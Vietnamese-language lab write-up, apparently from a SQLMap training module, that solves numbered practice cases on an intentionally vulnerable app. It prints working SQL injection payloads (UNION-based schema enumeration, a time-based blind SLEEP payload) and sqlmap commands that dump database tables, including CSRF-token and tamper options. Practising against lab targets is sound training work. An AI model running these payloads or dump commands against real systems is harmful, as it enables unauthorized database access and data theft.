<h1>Running SQLMap on an HTTP Request</h1>

![image](https://github.com/user-attachments/assets/f7e4c7f3-c852-47df-afe8-caccbe23cbe6)

![image](https://github.com/user-attachments/assets/581a802c-657d-48ff-8332-b769a30ccd68)

Giao diện web khi tôi truy cập vào:

![image](https://github.com/user-attachments/assets/cb955abc-53d3-4025-8739-cc46f61a99cb)

Bắt đầu với case2:

![image](https://github.com/user-attachments/assets/fc062b3f-0301-4010-952f-5f3bb8072ed3)

Sau khi submit id=1 thì ra cái này:

![image](https://github.com/user-attachments/assets/6029ae27-e0ae-4d36-a79e-92e63ab32a09)

Tôi dùng burp bắt request lại và đưa vào file req.txt:

![image](https://github.com/user-attachments/assets/ae7e65e6-41f7-469c-9fb9-aab0779138b2)

Rồi tôi chạy `sqlmap -r req.txt`:

![image](https://github.com/user-attachments/assets/826c2b9c-64a5-41b1-8f43-4a5d9fb20182)

![image](https://github.com/user-attachments/assets/3b183864-9dac-4c31-87d5-13e6ea3ba2f9)

Và kết quả nhận lại 3 loại sqli, tôi tin chọn dùng UNION query cho nhanh, đầu tiên là thử payload `1 UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9 -- -` để check thử:

![image](https://github.com/user-attachments/assets/8a9c8389-b0d0-4696-81ba-fa7d49d658b8)

Thấy chạy ổn ổn thì tôi sẽ xem thử trong bảng flag2 có những cột nào bằng payload `1 UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5,6,7,8,9 from INFORMATION_SCHEMA.COLUMNS where table_name='flag2'-- -`:

![image](https://github.com/user-attachments/assets/acf11b04-e543-4808-855e-39e5363e8455)

Nhìn vào tôi thấy được bảng flag2 thuộc testdb và gồm có 2 cột là id và content, dùng `1 UNION select 1, id, content, 4,5,6,7,8,9 from flag2-- -` để lấy content và id và flag2:

![image](https://github.com/user-attachments/assets/6757d16b-2421-44aa-8bec-805539cbbebf)

Đối với case3 thì cái id lại nằm trong cookie nên sqlmap không nhận ra được:

![image](https://github.com/user-attachments/assets/6c154c94-0ab1-4e66-a51d-332ad23c911d)

![image](https://github.com/user-attachments/assets/1a0f69dd-f446-4f97-8f02-4b371a1b010e)

Và sqlmap cũng bảo thêm cái --crawl vào nên tôi chạy lệnh `sqlmap -r req.txt --crawl=2 --batch` và kết quả đây:

![image](https://github.com/user-attachments/assets/e2dbdba7-48a0-4de8-8596-720663d37f13)

Lại như trước thôi:

![image](https://github.com/user-attachments/assets/4e470eec-07b9-4553-82c1-32d749ad30ef)

![image](https://github.com/user-attachments/assets/b6ae55c7-47ff-49f3-9d94-0b70f9371421)

case4 thì có id nằm trong json, dù thế thì vẫn như cũ thôi:

![image](https://github.com/user-attachments/assets/04b09f8e-4b57-4350-81e1-d6299cbb4e62)

![image](https://github.com/user-attachments/assets/4299aa7b-9871-4671-9796-0aa6436b29e5)

![image](https://github.com/user-attachments/assets/8908b8dc-ab87-4208-8612-e49629c71936)

<h1>Attack Tuning</h1>

![image](https://github.com/user-attachments/assets/6ff11b59-8e34-4209-9ca2-1bd14fcc0412)

TIếp tục với các case tiếp theo, case số 5:

![image](https://github.com/user-attachments/assets/3ccfda26-0af9-466f-90e3-ce86c69813c9)

![image](https://github.com/user-attachments/assets/8efe7a43-d862-45d6-a721-e41a805f27fb)

Method là GET, lúc đầu sqlmap chạy không ra, tôi thêm --level và --risk cho chắc cú `sqlmap -r req.txt --batch --level=5 --risk=3` và đây là kết quả, 1 boolean và 1 blind:

![image](https://github.com/user-attachments/assets/fe03fe49-79c9-46b0-852d-e1ff796e67d5)

Tôi quyết định dùng payload này `id=1 OR (SELECT 1 FROM (SELECT CASE WHEN (SUBSTRING((SELECT content FROM flag5 LIMIT 1), 1, 1)='a') THEN SLEEP(10) ELSE 0 END)aFuZ)` và dùng python để chạy payload:

![image](https://github.com/user-attachments/assets/6010df7c-6de7-4773-80a6-1c48378fdcb6)

![image](https://github.com/user-attachments/assets/2f9f1896-8868-4bd9-94a2-a2fef8f0ee82)

Cay

![image](https://github.com/user-attachments/assets/88e4777d-fc2c-42a6-b062-b8848b7466f8)

Dùng `sqlmap -r req.txt --batch --dump -T flag6 -D testdb --no-cast --level=5 --risk=3 --prefix='``)'` thêm cái --dump để ra luôn kết quả:

![image](https://github.com/user-attachments/assets/1dd466eb-2600-4591-a7e2-a2ff51a589b4)

![image](https://github.com/user-attachments/assets/737f3a14-1e42-4029-b931-2dcdb7cfc85d)

Nếu chạy không có --dump thì ra các loại sqli:

![image](https://github.com/user-attachments/assets/f230fb5d-6178-4c1c-8126-cb1363c690a5)

Tiếp theo là case7:

![image](https://github.com/user-attachments/assets/c727ed49-ae41-4577-85f4-47f8afc999c0)

![image](https://github.com/user-attachments/assets/bba9e7d1-a381-4c97-ad3f-a1b62375bdd1)

Lâu điênnn, à có thể dùng lệnh `sqlmap -r req.txt --batch --dump -T flag7 -D testdb --no-cast --level=5 --risk=3 --union-cols=5 --dbms=MySQL` cho chạy nhanh hơn!
<br>
Quay lại case1, do bố cục bài nó thế chứ không phải tôi thích thế:

![image](https://github.com/user-attachments/assets/5a27e41d-eeb7-449b-9052-3a10200416bc)

![image](https://github.com/user-attachments/assets/c820975c-1ed1-4a5c-a056-6ceb412028b3)

![image](https://github.com/user-attachments/assets/6faa0865-d491-47b0-97e1-45917b8f6f11)

![image](https://github.com/user-attachments/assets/bf9aae8c-8fa0-4206-9ff3-02d6e9e36e55)

Tiếp theo là case8, lần này có cả anti-CSRF token

![image](https://github.com/user-attachments/assets/746226b5-1011-4b5d-8c9b-46dad5a275b6)

Tôi chạy thử `sqlmap -r req.txt --batch --dump-all --data="id=1&csrf-token=d7uDKpYEqSSMbPv5guqQMr1H3yZsd0DhlkX1e8I0PIg" --csrf-token="t0ken"` và ngon:

![image](https://github.com/user-attachments/assets/27dfea84-a8a9-4ea6-b07f-2c765768533e)

Tôi chỉnh lại thành `sqlmap -r req.txt --batch --dump-all --data="id=1&csrf-token=d7uDKpYEqSSMbPv5guqQMr1H3yZsd0DhlkX1e8I0PIg" --csrf-token="t0ken" -D testdb -T flag8 --dbms
=MySQL --no-cast` để tăng tốc độ:

![image](https://github.com/user-attachments/assets/aa50156a-7407-4cab-84e4-294959352584)

Case9 có quả uid đặc biệt:

![image](https://github.com/user-attachments/assets/5b8881a4-c93d-4ffe-bb8e-101cefa5267c)

Tôi dùng `sqlmap -r req.txt --batch -level=5 --risk=3 --no-cast --batch --dump-all --randomize=uid -D testdb -T flag9 --dbms=MySQL` và ra:

![image](https://github.com/user-attachments/assets/4bf07934-69c8-4961-a290-61414f0af22c)

Case10 thì tôi cũng không biết nữa, tự nhiên nó ra bằng `sqlmap -r req.txt --batch -level=5 --risk=3 --no-cast --batch --dump-all -D testdb -T flag10 --dbms=MySQL` :

![image](https://github.com/user-attachments/assets/92fdf841-d045-4631-bd93-fe7c8c8ceb2f)

Case11 tôi sử dụng `sqlmap -r req.txt --batch -level=5 --risk=3 --no-cast --batch --dump-all --randomize=uid -D testdb -T flag11 --dbms=MySQL`:



Đợi lâu quá, tôi đi đọc forum thì thấy thêm tamper là `sqlmap -r req.txt -T flag11 --dump --risk=3 --level=5 --batch --tamper=greatest,least --threads=10`, thế là ra luôn:

![image](https://github.com/user-attachments/assets/f046decb-bc2d-433d-b861-3a4d4bdc58b9)

Nếu không biết dùng tamper nào thì có thể dùng `sqlmap -r req.txt -T flag11 --dump --risk=3 --level=5 --batch --list-tampers --threads=10`, vẫn ra flag như thường

